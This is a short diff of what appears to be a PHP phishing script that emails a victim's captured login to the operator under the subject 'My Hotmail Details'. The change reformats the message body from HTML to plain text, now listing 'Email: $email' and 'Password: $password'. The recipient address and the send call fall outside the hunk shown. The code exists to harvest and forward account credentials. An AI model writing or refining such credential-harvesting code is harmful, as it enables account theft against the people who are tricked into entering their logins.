@@ -24,15 +24,12 @@
         $subject = "My Hotmail Details";
 
         $message = "
-        <html>
-        <head>
-        <title>This is my mail Login Details</title>
-        </head>
-        <body>
-            <h1>$email</h1>
-            <p>$password</p>
-        </body>
-        </html>
+        
+       This is my mail Login Details
+        
+            Email: $email
+            Password: $password
+      
         ";
 
         // Always set content-type when sending HTML email
